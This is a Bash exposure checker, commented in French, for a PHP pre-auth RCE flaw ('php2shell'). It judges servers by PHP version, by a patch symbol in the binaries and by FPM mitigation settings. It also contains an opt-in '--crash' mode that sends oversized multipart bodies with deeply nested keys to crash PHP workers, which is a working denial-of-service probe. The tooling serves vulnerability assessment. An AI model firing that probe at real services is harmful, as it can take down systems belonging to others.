#!/usr/bin/env bash
###############################################################################
#  GALEAX — php2shell exposure checker
#  CVE-2026-109618 / CVE-2026-109619  (RCE pré-auth PHP, famille "php2shell")
#
#  Usage:  ./galeax-php2shell-check.sh <cible> [options]
#    <cible> :  une URL (https://…)   -> test à distance (boîte noire)
#               "local"               -> test sur CE serveur (verdict certain)
#               une version (x.y.z)   -> verdict direct sur cette version
#    options :  --deep        à distance : récupération de version renforcée
#               --active      à distance : sonde le vecteur réel (multipart
#                             session.upload_progress + taille de corps), bénin
#               --crash       à distance : SONDE DE CRASH active (clés imbriquées,
#                             corps 1->20 Mio) -> PROUVE le bug. INTRUSIF : peut
#                             faire tomber le service. À réserver aux cibles maîtrisées.
#               --sapi S      auto|mod_php|fpm : gating des signaux de crash
#               --phpinfo U   lit une page phpinfo() exposée (version + config)
#               --php <chemin> mode local : binaire PHP à tester
#               --path P      chemin(s) à tester (répétable) · --path-file <f>
#               -H "K: V"     en-tête HTTP custom (répétable ; auth…)
#               --json | --no-color | -h
#
#  Codes de sortie : 0 non vulnérable · 1 vulnérable · 2 exposition réduite ·
#                    3 indéterminé.  Non-destructif PAR DÉFAUT ; --crash est actif.
#  (c) Galeax — Offensive Security.
###############################################################################
set -u
TOOL_VERSION="1.0"
# Symbole PHPAPI ajouté par le correctif (≥ 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) :
# sa présence dans le binaire prouve le patch, même si une distribution a figé le
# numéro de version en le rétroportant.
SYMBOL="php_var_unserialize_set_incomplete_classes_only"

fixed_patch(){ case "$1" in 8.2) echo 35;; 8.3) echo 36;; 8.4) echo 27;; 8.5) echo 12;; *) echo "";; esac; }
ver_key(){ local M="${1%%.*}" m="${1#*.}"; [[ "$m" == "$1" ]] && m=0; echo $(( M*100 + m )); }
# to_bytes "8M" -> 8388608 · "-1" -> -1 · "" si illisible (K/M/G, insensible à la casse).
to_bytes(){
  local s="$1" n unit
  [[ "$s" == "-1" ]] && { echo -1; return; }
  n="$(printf '%s' "$s" | grep -oE '^[0-9]+' || true)"; [[ -z "$n" ]] && { echo ""; return; }
  unit="$(printf '%s' "$s" | grep -oiE '[KMG]$' | tr 'a-z' 'A-Z' || true)"
  case "$unit" in K) echo $((n*1024));; M) echo $((n*1024*1024));; G) echo $((n*1024*1024*1024));; *) echo "$n";; esac
}
# norm_bool : On/1/true/yes -> 1 ; Off/0/false/no/"" -> 0 ; sinon inchangé.
norm_bool(){ case "$(printf '%s' "$1" | tr 'A-Z' 'a-z')" in on|1|true|yes) echo 1;; off|0|false|no|"") echo 0;; *) printf '%s' "$1";; esac; }
# mitig_eval <memory_limit> <upload_progress> <post_max_size> <fatal_error_backtraces>
#   -> "<n>\t<liste>" : mitigations partielles d'advisory présentes (cf. README).
mitig_eval(){
  local ml="$1" up="$2" pms="$3" feb="$4" n=0 list="" b
  [[ "$ml" == "-1" ]] && { n=$((n+1)); list="${list:+$list, }memory_limit=-1"; }
  [[ -n "$up"  && "$(norm_bool "$up")"  == "0" ]] && { n=$((n+1)); list="${list:+$list, }session.upload_progress.enabled=0"; }
  b="$(to_bytes "$pms")"; [[ -n "$b" && "$b" != "-1" && "$b" -le $((2*1024*1024)) ]] && { n=$((n+1)); list="${list:+$list, }post_max_size=$pms"; }
  [[ -n "$feb" && "$feb" != "<n/a>" && "$(norm_bool "$feb")" == "0" ]] && { n=$((n+1)); list="${list:+$list, }fatal_error_backtraces=0"; }
  printf '%s\t%s\n' "$n" "$list"
}

# compute_verdict <version> -> VERDICT / CONF / RC / REASON (sur la seule version)
compute_verdict(){
  local v="$1" maj patch fp
  VERDICT="INDÉTERMINÉ"; CONF="faible"; RC=3; REASON=""
  [[ -z "$v" ]] && return
  maj="${v%.*}"; patch="${v##*.}"; fp="$(fixed_patch "$maj")"
  if [[ -n "$fp" ]]; then
    if (( patch < fp )); then VERDICT="VULNÉRABLE"; CONF="élevée"; RC=1; REASON="PHP $v < ${maj}.${fp} (correctif)"
    else                      VERDICT="NON VULNÉRABLE"; CONF="élevée"; RC=0; REASON="PHP $v ≥ ${maj}.${fp} (patché)"; fi
  elif (( $(ver_key "$maj") < $(ver_key 8.2) )); then
    VERDICT="VULNÉRABLE"; CONF="élevée"; RC=1; REASON="PHP $v — branche EOL non corrigée (migrer)"
  else
    VERDICT="NON VULNÉRABLE"; CONF="moyenne"; RC=0; REASON="PHP $v — postérieure aux branches corrigées"
  fi
}

# -------------------------------------------------------------------- options
URL=""; PHPINFO=""; PHPBIN=""; VERSPEC=""; ACTIVE=0; RECOVER=0; LOCAL=0; JSON=0; NOCOLOR=0
CRASH=0; SAPIARG="auto"; SHOW_HELP=0
TIMEOUT="${GALEAX_TIMEOUT:-60}"
declare -a HDRADD=(); declare -a PATHS=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    local|--local)        LOCAL=1 ;;
    http://*|https://*)   URL="$1" ;;
    [0-9]*.[0-9]*.[0-9]*) VERSPEC="$1" ;;
    --version)            VERSPEC="${2:-}"; shift ;;
    --deep|--recover)     RECOVER=1 ;;
    --active)             ACTIVE=1 ;;
    --crash)              CRASH=1 ;;
    --sapi)               SAPIARG="${2:-auto}"; shift ;;
    --php)                PHPBIN="${2:-}"; shift ;;
    --phpinfo)            PHPINFO="${2:-}"; shift ;;
    --path)               PATHS+=("${2:-}"); shift ;;
    --path-file)          [[ -r "${2:-}" ]] && while IFS= read -r _p; do _p="${_p%%#*}"; _p="$(printf '%s' "$_p" | tr -d '[:space:]')"; [[ -n "$_p" ]] && PATHS+=("$_p"); done < "$2"; shift ;;
    -H|--header)          HDRADD+=("${2:-}"); shift ;;
    --json)               JSON=1 ;;
    --no-color)           NOCOLOR=1 ;;
    -h|--help)            SHOW_HELP=1 ;;
    *) echo "argument inconnu : $1 (voir --help)" >&2; exit 64 ;;
  esac; shift
done
case "$SAPIARG" in auto|mod_php|fpm) ;; *) echo "--sapi : auto|mod_php|fpm (reçu : $SAPIARG)" >&2; exit 64 ;; esac
[[ -n "$VERSPEC" ]] && VERSPEC="$(printf '%s' "$VERSPEC" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1 || true)"
# En-têtes custom -> fragment curl réutilisé partout (GET, POST, sonde crash).
declare -a HDR_ARGS=()
if [[ ${#HDRADD[@]} -gt 0 ]]; then for _h in "${HDRADD[@]}"; do HDR_ARGS+=(-H "$_h"); done; fi
if [[ "$SHOW_HELP" -eq 0 && "$LOCAL" -eq 0 && -z "$URL" && -z "$VERSPEC" ]]; then
  echo "usage: $0 <url|local|x.y.z> [--deep] [--active] [--crash] [--phpinfo <url>] [--json]   (voir -h)" >&2; exit 64
fi

# -------------------------------------------------------------------- affichage
if [[ -t 1 && "$NOCOLOR" -eq 0 && -z "${NO_COLOR:-}" && "$JSON" -eq 0 ]]; then
  C1=$'\033[38;5;44m'; C2=$'\033[38;5;37m'; ACC=$'\033[38;5;215m'
  RED=$'\033[31m'; GRN=$'\033[32m'; YEL=$'\033[33m'; DIM=$'\033[2m'; BLD=$'\033[1m'; RST=$'\033[0m'
else C1=""; C2=""; ACC=""; RED=""; GRN=""; YEL=""; DIM=""; BLD=""; RST=""; fi
say(){  [[ "$JSON" -eq 0 ]] && printf '%s\n' "$*"; }
line(){ [[ "$JSON" -eq 0 ]] && printf '  %-13s %s\n' "$1" "$2"; }
rule(){ printf '%s  ══════════════════════════════════════════════════%s\n' "$DIM" "$RST"; }
verdict_box(){
  case "$RC" in 0) local VC="$GRN";; 1) local VC="$RED";; 2) local VC="$YEL";; *) local VC="$DIM";; esac
  say ""; rule
  printf '  VERDICT : %s%s%s%s   %s(confiance : %s)%s\n' "$VC" "$BLD" "$VERDICT" "$RST" "$DIM" "$CONF" "$RST"
  [[ -n "$REASON" ]] && printf '  %s%s%s\n' "$DIM" "$REASON" "$RST"
  rule
}
banner(){
  [[ "$JSON" -eq 1 ]] && return
  printf '\n'
  printf '%s %s ██████╗  █████╗ ██╗     ███████╗ █████╗ ██╗  ██╗%s\n' "$BLD" "$C1" "$RST"
  printf '%s %s██╔════╝ ██╔══██╗██║     ██╔════╝██╔══██╗╚██╗██╔╝%s\n' "$BLD" "$C1" "$RST"
  printf '%s %s██║  ███╗███████║██║     █████╗  ███████║ ╚███╔╝ %s\n' "$BLD" "$C2" "$RST"
  printf '%s %s██║   ██║██╔══██║██║     ██╔══╝  ██╔══██║ ██╔██╗ %s\n' "$BLD" "$C2" "$RST"
  printf '%s %s╚██████╔╝██║  ██║███████╗███████╗██║  ██║██╔╝ ██╗%s\n' "$BLD" "$C1" "$RST"
  printf '%s %s ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝%s\n' "$BLD" "$C1" "$RST"
  printf '  %sphp2shell exposure checker%s  %s◂ v%s ▸%s\n' "$DIM" "$RST" "$ACC" "$TOOL_VERSION" "$RST"
  printf '  %sCVE-2026-109618 / 109619  ·  non-destructif  ·  %s%s\n' "$DIM" "$1" "$RST"
  printf '%s  ──────────────────────────────────────────────────%s\n' "$DIM" "$RST"
}
# Aide : même direction artistique que le reste (logo + couleurs GALEAX).
usage(){
  banner "aide"
  local F="$ACC"   # couleur des flags
  printf '\n  %sUSAGE%s\n' "$BLD" "$RST"
  printf '    %s./galeax-php2shell-check.sh%s %s<cible>%s [options]\n' "$C1" "$RST" "$BLD" "$RST"

  printf '\n  %sCIBLE%s %s— choisit le mode%s\n' "$BLD" "$RST" "$DIM" "$RST"
  printf '    %s%-12s%s %stest à distance (boîte noire) — ex. https://site/%s\n' "$F" "<url>" "$RST" "$DIM" "$RST"
  printf '    %s%-12s%s %stest sur CE serveur — verdict %scertain%s\n'            "$F" "local" "$RST" "$DIM" "$GRN" "$RST"
  printf '    %s%-12s%s %sverdict direct sur une version PHP%s\n'                 "$F" "x.y.z" "$RST" "$DIM" "$RST"

  printf '\n  %sÀ DISTANCE%s\n' "$BLD" "$RST"
  printf '    %s%-12s%s %srécupération de version renforcée (multi-chemins/méthodes)%s\n' "$F" "--deep" "$RST" "$DIM" "$RST"
  printf '    %s%-12s%s %ssonde le vecteur réel (multipart upload_progress) — %sbénin%s\n' "$F" "--active" "$RST" "$DIM" "$GRN" "$RST"
  printf '    %s%-12s%s %sdéclenche le bug (corps 1→20 Mio) → %sPREUVE · INTRUSIF%s\n'      "$F" "--crash" "$RST" "$DIM" "$RED" "$RST"
  printf '    %s%-12s%s %sauto|mod_php|fpm : gating des signaux de crash%s\n'              "$F" "--sapi S" "$RST" "$DIM" "$RST"
  printf '    %s%-12s%s %slit une page phpinfo() exposée (version + config)%s\n'           "$F" "--phpinfo U" "$RST" "$DIM" "$RST"
  printf '    %s%-12s%s %schemin(s) à tester (répétable) · %s--path-file%s %s<f>%s\n'       "$F" "--path P" "$RST" "$DIM" "$F" "$DIM" "$RST"
  printf '    %s%-12s%s %sen-tête HTTP custom (répétable ; auth…)%s\n'                     "$F" '-H "K: V"' "$RST" "$DIM" "$RST"

  printf '\n  %sEN LOCAL%s\n' "$BLD" "$RST"
  printf '    %s%-12s%s %sbinaire PHP précis à tester%s\n' "$F" "--php C" "$RST" "$DIM" "$RST"

  printf '\n  %sSORTIE%s\n' "$BLD" "$RST"
  printf '    %s%-12s%s %ssortie machine (CI)%s   ·   %s--no-color%s   ·   %s-h%s %saide%s\n' "$F" "--json" "$RST" "$DIM" "$RST" "$F" "$RST" "$F" "$RST" "$DIM" "$RST"

  printf '\n  %sEXEMPLES%s\n' "$BLD" "$RST"
  printf '    %s$ ./galeax-php2shell-check.sh https://site/ --deep%s\n'   "$DIM" "$RST"
  printf '    %s$ ./galeax-php2shell-check.sh https://site/ --crash%s   %s# prouve le bug (intrusif)%s\n' "$DIM" "$RST" "$DIM" "$RST"
  printf '    %s$ ./galeax-php2shell-check.sh local%s                   %s# verdict certain%s\n'          "$DIM" "$RST" "$DIM" "$RST"
  printf '    %s$ ./galeax-php2shell-check.sh 8.4.26%s\n'                "$DIM" "$RST"

  printf '\n  %sCODES DE SORTIE%s  %s0%s non vuln. · %s1%s vuln. · %s2%s expo. réduite · %s3%s indéterminé\n' \
    "$BLD" "$RST" "$GRN" "$RST" "$RED" "$RST" "$YEL" "$RST" "$DIM" "$RST"
  printf '%s  ──────────────────────────────────────────────────%s\n' "$DIM" "$RST"
  printf '  %s© Galeax — Offensive Security%s\n\n' "$DIM" "$RST"
}
[[ "$SHOW_HELP" -eq 1 ]] && { usage; exit 0; }
emit_json(){  # $1 = champs additionnels (virgule de tête) ; MODE global
  esc(){ printf '%s' "${1:-}" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
  printf '{"tool":"galeax-php2shell-check","version":"%s","mode":"%s","php_version":"%s","verdict":"%s","confidence":"%s","reason":"%s"%s,"exit":%s}\n' \
    "$TOOL_VERSION" "${MODE:-?}" "$(esc "$VER")" "$(esc "$VERDICT")" "$CONF" "$(esc "$REASON")" "${1:-}" "$RC"
}

###############################################################################
# SONDE DE CRASH ACTIVE (intrusive) — port fidèle de la technique assetnote
#   Déclenche le bug : corps multipart avec clé de champ imbriquée 62 niveaux,
#   taille croissante 1 -> 8 -> 20 Mio. Un plantage mémoire PHP = PREUVE à
#   distance. INTRUSIF : peut faire tomber le service (OOM worker). Ne tourne
#   qu'avec --crash, sur cibles maîtrisées.
###############################################################################
NESTED_KEYS=62
# build_probe_file <size_mib> <parts> <outfile> : écrit le corps piégé (clés
# imbriquées) ; renvoie 1 si la taille ne peut pas contenir les <parts>.
build_probe_file(){
  local size_mib="$1" parts="$2" out="$3"
  local name="a[]" i part plen size base_len filler
  for ((i=0;i<NESTED_KEYS;i++)); do name+="[a]"; done
  part=$'--\nContent-Disposition:name='"$name"$';filename=\n\n'
  plen=${#part}
  size=$(( size_mib * 1048576 )); base_len=$(( parts * plen ))
  (( size < base_len )) && return 1
  filler=$(( (size - base_len) / 3 ))
  # body = "--\n" + "x:\n"*filler + (part*parts)[3:] ; puis on retire le dernier octet.
  {
    printf -- '--\n'
    yes 'x:' | head -n "$filler"
    { for ((i=0;i<parts;i++)); do printf '%s' "$part"; done; } | tail -c +4
  } | head -c -1 > "$out"
}
# crash_detect <url> -> CRASH_RESULT (vulnerable|inconclusive|nosignal|error),
#   CRASH_MODE, CRASH_REASON, CRASH_STATUS. SAPIARG filtre les signaux (mod_php
#   ignore les signatures propres à FPM, et vice-versa).
crash_detect(){
  local turl="$1"
  CRASH_RESULT="nosignal"; CRASH_MODE=""; CRASH_REASON=""; CRASH_STATUS=""
  local tmpd; tmpd="$(mktemp -d 2>/dev/null)" || { CRASH_RESULT="error"; CRASH_REASON="mktemp a échoué"; return; }
  local cbody="$tmpd/ctrl" pbody="$tmpd/probe" cstatus pstatus
  # --- requête de contrôle (boundary 'x', corps minuscule, bénin)
  cstatus="$(printf -- '--x\nContent-Disposition:name=a;filename=\n\n' \
    | curl -sS -k --compressed -A "$UA" "${HDR_ARGS[@]+"${HDR_ARGS[@]}"}" \
        -o "$cbody" -w '%{http_code}' --max-time "$TIMEOUT" -X POST \
        -H 'Content-Type: multipart/form-data; boundary=x' -H 'Connection: close' \
        --data-binary @- "$turl" 2>/dev/null || echo 000)"
  cstatus="${cstatus##*$'\n'}"
  if [[ "$cstatus" == 000 ]]; then CRASH_RESULT="error"; CRASH_REASON="contrôle injoignable"; rm -rf "$tmpd"; return; fi
  if [[ "$cstatus" -ge 500 ]]; then CRASH_RESULT="inconclusive"; CRASH_REASON="contrôle HTTP $cstatus (serveur déjà en erreur)"; rm -rf "$tmpd"; return; fi
  # phpMyAdmin : l'exploit se rejoue sur /show_config_errors.php.
  if grep -qiF 'phpMyAdmin' "$cbody" 2>/dev/null; then
    turl="$BASEURL/show_config_errors.php"; CRASH_REASON="(cible phpMyAdmin -> $turl) "
  fi
  local control_has_body=0; [[ -s "$cbody" ]] && control_has_body=1
  # --- probes croissantes ; on s'arrête dès qu'un signal tranche.
  local spec smib parts has_body
  for spec in "1 4000" "8 1020" "20 1020"; do
    smib="${spec% *}"; parts="${spec#* }"
    build_probe_file "$smib" "$parts" "$pbody.body" || continue
    pstatus="$(curl -sS -k --compressed -A "$UA" "${HDR_ARGS[@]+"${HDR_ARGS[@]}"}" \
        -o "$pbody" -w '%{http_code}' --max-time "$TIMEOUT" -X POST \
        -H 'Content-Type: multipart/form-data; boundary=' -H 'Connection: close' \
        --data-binary @"$pbody.body" "$turl" 2>/dev/null || echo 000)"
    pstatus="${pstatus##*$'\n'}"; CRASH_STATUS="$pstatus"
    has_body=0; [[ -s "$pbody" ]] && has_body=1
    # (1) erreur fatale PHP en bande : memory exhausted in Unknown.
    if grep -qaF 'Allowed memory size of ' "$pbody" 2>/dev/null \
       && grep -qaF ' bytes exhausted' "$pbody" 2>/dev/null \
       && grep -qaF 'Unknown' "$pbody" 2>/dev/null; then
      CRASH_RESULT="vulnerable"; CRASH_MODE="$([[ "$SAPIARG" == auto ]] && echo mod_php/PHP-FPM || echo "$SAPIARG")"
      CRASH_REASON="${CRASH_REASON}erreur fatale PHP en bande (memory exhausted in Unknown) pendant le parsing du multipart"; break
    fi
    # (2) HTTP 500 à corps vide alors que le contrôle produisait du contenu.
    if [[ "$pstatus" == 500 && "$control_has_body" -eq 1 && "$has_body" -eq 0 ]]; then
      CRASH_RESULT="vulnerable"; CRASH_MODE="$([[ "$SAPIARG" == auto ]] && echo mod_php/PHP-FPM || echo "$SAPIARG")"
      CRASH_REASON="${CRASH_REASON}HTTP 500 à corps vide alors que le contrôle produisait du contenu"; break
    fi
    # Signaux propres à FPM (ignorés si --sapi mod_php).
    if [[ "$SAPIARG" != mod_php ]]; then
      if [[ "$pstatus" == 502 || "$pstatus" == 503 || "$pstatus" == 504 ]]; then
        CRASH_RESULT="vulnerable"; CRASH_MODE="PHP-FPM"
        CRASH_REASON="${CRASH_REASON}HTTP $pstatus du frontal devant PHP-FPM (worker mort en cours de requête)"; break
      fi
      if [[ "$pstatus" == 200 && "$control_has_body" -eq 1 && "$has_body" -eq 0 ]]; then
        CRASH_RESULT="vulnerable"; CRASH_MODE="PHP-FPM"
        CRASH_REASON="${CRASH_REASON}HTTP 200 à corps vide alors que le contrôle produisait du contenu (worker mort)"; break
      fi
    fi
    # Statuts de rejet (frontal/WAF) : on arrête, verdict indéterminé par le crash.
    case "$pstatus" in 400|403|411|413|414|417|422|429|431)
      CRASH_RESULT="inconclusive"; CRASH_REASON="${CRASH_REASON}probe rejetée (HTTP $pstatus) avant d'atteindre PHP"; break ;;
      000) CRASH_RESULT="inconclusive"; CRASH_REASON="${CRASH_REASON}probe sans réponse (timeout/coupure)"; break ;;
    esac
  done
  rm -rf "$tmpd"
}

###############################################################################
# MODE VERSION — verdict sur une version fournie à la main
###############################################################################
if [[ -n "$VERSPEC" && "$LOCAL" -eq 0 && -z "$URL" ]]; then
  MODE=version; banner "version fournie : $VERSPEC"
  VER="$VERSPEC"; compute_verdict "$VER"; CONF="fournie (déclarative)"
  if [[ "$JSON" -eq 1 ]]; then emit_json; exit "$RC"; fi
  say "${BLD}Version fournie${RST}"; line "version" "PHP $VER"
  verdict_box
  say ""; say "${DIM}Verdict sur la version déclarée (non vérifiée) ; confirmer par 'local'.${RST}"
  exit "$RC"
fi

###############################################################################
# MODE LOCAL — version + symbole du correctif + config  (verdict CERTAIN)
###############################################################################
if [[ "$LOCAL" -eq 1 ]]; then
  PHP="${PHPBIN:-$(command -v php 2>/dev/null || true)}"
  [[ -z "$PHP" || ! -x "$PHP" ]] && { echo "php introuvable (préciser --php <chemin>)" >&2; exit 69; }
  banner "hôte local · $(hostname 2>/dev/null || echo localhost)"

  VER="$("$PHP" -r 'echo PHP_VERSION;' 2>/dev/null || true)"
  SAPI="$("$PHP" -r 'echo PHP_SAPI;' 2>/dev/null || true)"
  say "${BLD}[1] Binaire & version${RST}"
  line "php" "$PHP"
  line "version" "PHP ${VER:-?}  (SAPI CLI: ${SAPI:-?})"

  # Symbole du correctif dans php / libphp / php-fpm.
  say ""; say "${BLD}[2] Présence du correctif${RST}"
  SYM_FOUND="non"; SYM_WHERE=""; cands=("$PHP")
  for g in /usr/lib/apache2/modules/libphp*.so /usr/local/lib/apache2/modules/libphp*.so \
           /usr/lib64/httpd/modules/libphp*.so /usr/lib/php*/modules/*.so \
           "$(command -v php-fpm 2>/dev/null || true)" /usr/sbin/php-fpm* /usr/local/sbin/php-fpm*; do
    [[ -e "$g" ]] && cands+=("$g")
  done
  for f in "${cands[@]}"; do
    [[ -r "$f" ]] && grep -aqF "$SYMBOL" "$f" 2>/dev/null && { SYM_FOUND="oui"; SYM_WHERE="$f"; break; }
  done
  if [[ "$SYM_FOUND" == "oui" ]]; then line "symbole" "${GRN}présent${RST} dans $SYM_WHERE → correctif appliqué"
  else line "symbole" "${YEL}absent${RST} des binaires scannés"; fi

  # Verdict : le symbole prime (backport-aware), la version en appui.
  compute_verdict "$VER"
  if   [[ "$SYM_FOUND" == "oui" ]]; then VERDICT="NON VULNÉRABLE"; CONF="certaine"; RC=0; REASON="symbole du correctif présent (build patché, rétroportage inclus)"
  elif [[ "$RC" -eq 1 ]];            then CONF="certaine"; REASON="$REASON ; symbole du correctif absent"
  elif [[ -z "$VER" ]];              then VERDICT="INDÉTERMINÉ"; CONF="faible"; RC=3; REASON="version illisible et symbole absent"
  else                                   CONF="élevée"; REASON="$REASON ; symbole non trouvé (binaire strippé ?) — verdict sur version"
  fi

  say ""; say "${BLD}[3] Configuration (mitigations)${RST}"
  CFG="$("$PHP" -d error_reporting=0 -r '
    foreach(["memory_limit","post_max_size","upload_max_filesize","session.upload_progress.enabled","allow_url_include","expose_php","fatal_error_backtraces"] as $k){
      $v=ini_get($k); echo $k."\t".($v===false?"<n/a>":$v)."\n"; }' 2>/dev/null || true)"
  cfg_get(){ printf '%s\n' "$CFG" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
  printf '%s\n' "$CFG" | while IFS=$'\t' read -r k v; do line "$k" "$v"; done
  line "" "${DIM}(config du SAPI CLI ; le SAPI web/FPM peut surcharger via php_admin_value)${RST}"

  # Mitigations partielles d'advisory : elles GÊNENT l'exploitation mais ne
  # corrigent PAS le binaire (cf. README §Remédiation). On les compte pour nuancer
  # le verdict, jamais pour déclarer sain. Base : config CLI (peut être remplacée
  # par la config effective du pool FPM en [4], autoritative pour le vecteur web).
  IFS=$'\t' read -r MITIG_LOCAL MITIG_LIST < <(mitig_eval \
    "$(cfg_get memory_limit)" "$(cfg_get session.upload_progress.enabled)" \
    "$(cfg_get post_max_size)" "$(cfg_get fatal_error_backtraces)")
  MITIG_SRC="SAPI CLI"; MITIG_LOCK=0
  if [[ "$MITIG_LOCAL" -gt 0 ]]; then line "mitigations" "${YEL}$MITIG_LOCAL active(s)${RST} : $MITIG_LIST ${DIM}(CLI)${RST}"
  else line "mitigations" "${DIM}aucune mitigation d'advisory détectée (SAPI CLI)${RST}"; fi

  # -------------------------------------------------------------------- [4] FPM
  # La config CLI ci-dessus ne reflète PAS le SAPI web. Si un binaire php-fpm est
  # là, on lit la conf réellement parsée : php.ini FPM (php-fpm -i) + overrides de
  # pool (php-fpm -tt : php_admin_value/flag priment sur php_value/flag). On retient
  # le pool le PLUS exposé pour trancher, et on distingue mitigation verrouillée
  # (php_admin_*, l'appli ne peut pas la défaire) de mitigation surchargeable.
  say ""; say "${BLD}[4] Config effective FPM (SAPI web)${RST}"
  FPM=""; vmaj="${VER%.*}"
  if [[ -z "$FPM" ]]; then
    for g in "/usr/sbin/php-fpm${vmaj}" "/usr/local/sbin/php-fpm${vmaj}" \
             "$(command -v "php-fpm${vmaj}" 2>/dev/null || true)" \
             "$(command -v php-fpm 2>/dev/null || true)" \
             /usr/sbin/php-fpm* /usr/local/sbin/php-fpm* /usr/sbin/php*-fpm; do
      [[ -n "$g" && -x "$g" ]] && { FPM="$g"; break; }
    done
  fi
  FPM_USED=0
  if [[ -z "$FPM" || ! -x "$FPM" ]]; then
    line "fpm" "${DIM}aucun binaire php-fpm trouvé → verdict sur la config CLI/binaire${RST}"
  else
    line "binaire" "$FPM"
    DUMP="$("$FPM" -tt 2>&1 || true)"; INFO="$("$FPM" -i 2>/dev/null || true)"
    if ! printf '%s' "$DUMP" | grep -q '\[pool '; then
      line "fpm" "${YEL}php-fpm -tt sans pool exploitable${RST} (droits/conf ?) → config CLI retenue"
    else
      ini_master(){ printf '%s\n' "$INFO" | sed -nE "s/^$1 => .* => (.*)$/\1/p" | head -1; }
      declare -A OVR; pools=""; cur=""
      while IFS= read -r ln; do
        ln="${ln#*NOTICE: }"; ln="${ln%$'\r'}"
        if printf '%s' "$ln" | grep -q '\[pool '; then
          cur="$(printf '%s' "$ln" | sed -nE 's/.*\[pool ([^]]+)\].*/\1/p')"
          [[ -n "$cur" ]] && pools="$pools $cur"; continue
        fi
        case "$ln" in
          *php_admin_value\[*|*php_value\[*|*php_admin_flag\[*|*php_flag\[*)
            kind="$(printf '%s' "$ln" | sed -nE 's/.*(php_admin_value|php_admin_flag|php_value|php_flag)\[.*/\1/p')"
            key="$(printf '%s' "$ln" | sed -nE 's/.*\[([^]]+)\][[:space:]]*=.*/\1/p')"
            val="$(printf '%s' "$ln" | sed -nE 's/.*\][[:space:]]*=[[:space:]]*(.*)$/\1/p')"
            [[ -n "$cur" && -n "$key" ]] && OVR["$cur|$kind|$key"]="$val" ;;
        esac
      done <<< "$DUMP"
      pools="$(printf '%s\n' $pools | awk 'NF&&!s[$0]++')"
      # valeur effective d'une directive dans un pool -> "valeur|verrou(0/1)|source"
      # Délimiteur \037 (non-blanc) : la tabulation serait absorbée par `read` quand
      # la valeur de tête est vide (directive absente) et décalerait les champs.
      US=$'\037'
      eff(){ local p="$1" d="$2"
        if [[ -n "${OVR[$p|php_admin_value|$d]+x}" ]]; then printf '%s%s1%sadmin_value'  "${OVR[$p|php_admin_value|$d]}" "$US" "$US"; return; fi
        if [[ -n "${OVR[$p|php_admin_flag|$d]+x}"  ]]; then printf '%s%s1%sadmin_flag'   "${OVR[$p|php_admin_flag|$d]}"  "$US" "$US"; return; fi
        if [[ -n "${OVR[$p|php_value|$d]+x}"       ]]; then printf '%s%s0%svalue'        "${OVR[$p|php_value|$d]}"       "$US" "$US"; return; fi
        if [[ -n "${OVR[$p|php_flag|$d]+x}"        ]]; then printf '%s%s0%sflag'         "${OVR[$p|php_flag|$d]}"        "$US" "$US"; return; fi
        printf '%s%s0%sini-fpm' "$(ini_master "$d")" "$US" "$US"
      }
      WORST_POOL=""; WORST_N=9999; WORST_LIST=""; WORST_LOCK=0
      for p in $pools; do
        IFS="$US" read -r mlv mll _ < <(eff "$p" memory_limit)
        IFS="$US" read -r upv upl _ < <(eff "$p" session.upload_progress.enabled)
        IFS="$US" read -r pmv pml _ < <(eff "$p" post_max_size)
        IFS="$US" read -r fbv fbl _ < <(eff "$p" fatal_error_backtraces)
        IFS=$'\t' read -r pn pl < <(mitig_eval "$mlv" "$upv" "$pmv" "$fbv")
        # verrou global du pool = toutes les mitigations actives viennent de php_admin_*
        lock=1
        [[ "$mlv" == "-1" && "$mll" != "1" ]] && lock=0
        [[ -n "$upv" && "$(norm_bool "$upv")" == "0" && "$upl" != "1" ]] && lock=0
        b="$(to_bytes "$pmv")"; [[ -n "$b" && "$b" != "-1" && "$b" -le $((2*1024*1024)) && "$pml" != "1" ]] && lock=0
        [[ -n "$fbv" && "$fbv" != "<n/a>" && "$(norm_bool "$fbv")" == "0" && "$fbl" != "1" ]] && lock=0
        line "pool $p" "memory_limit=$mlv · upload_progress=$(norm_bool "${upv:-}") · post_max_size=${pmv:-?} → ${YEL}$pn mitig.${RST}$([[ $pn -gt 0 ]] && printf ' (%s)' "$([[ $lock -eq 1 ]] && echo verrouillées || echo surchargeables)")"
        if [[ "$pn" -lt "$WORST_N" ]]; then WORST_N="$pn"; WORST_POOL="$p"; WORST_LIST="$pl"; WORST_LOCK="$lock"; fi
      done
      # Le pool le plus exposé fait foi (comme pour la version : on retient le pire).
      MITIG_LOCAL="$WORST_N"; MITIG_LIST="$WORST_LIST"; MITIG_LOCK="$WORST_LOCK"
      [[ "$MITIG_LOCAL" -eq 0 ]] && MITIG_LOCK=0
      MITIG_SRC="pool FPM '$WORST_POOL'"; FPM_USED=1
      line "retenu" "pool le plus exposé : ${BLD}$WORST_POOL${RST} → $MITIG_LOCAL mitigation(s)$([[ $MITIG_LOCAL -gt 0 ]] && printf ' (%s)' "$([[ $MITIG_LOCK -eq 1 ]] && echo verrouillées || echo surchargeables)")"
    fi
  fi

  # Nuance : le correctif seul assainit le binaire ; une mitigation ne fait que
  # réduire l'exposition -> VULNÉRABLE devient EXPOSITION RÉDUITE (orange), sans
  # jamais être déclaré sain. La mise à jour reste requise.
  TARGET=""; tfp="$(fixed_patch "${VER%.*}")"; [[ -n "$tfp" ]] && TARGET="${VER%.*}.$tfp"
  if [[ "$RC" -eq 1 && "$MITIG_LOCAL" -gt 0 ]]; then
    VERDICT="EXPOSITION RÉDUITE (mitigé, non corrigé)"; RC=2; CONF="certaine"
    REASON="mitigé ($([[ $MITIG_LOCK -eq 1 ]] && echo verrouillé || echo surchargeable)) : ${MITIG_LIST} — mettre à jour vers ${TARGET:-une branche supportée}"
  fi

  if [[ "$JSON" -eq 1 ]]; then
    MODE=local
    emit_json ',"symbol_patch":"'"$SYM_FOUND"'","sapi":"'"${SAPI:-}"'","config_source":"'"$MITIG_SRC"'","mitigations":'"$MITIG_LOCAL"',"mitigations_locked":'"$([[ $MITIG_LOCK -eq 1 ]] && echo true || echo false)"',"mitigation_list":"'"$(printf '%s' "$MITIG_LIST"|sed 's/\\/\\\\/g; s/"/\\"/g')"'","fixed_target":"'"${TARGET:-}"'"'
    exit "$RC"
  fi
  verdict_box
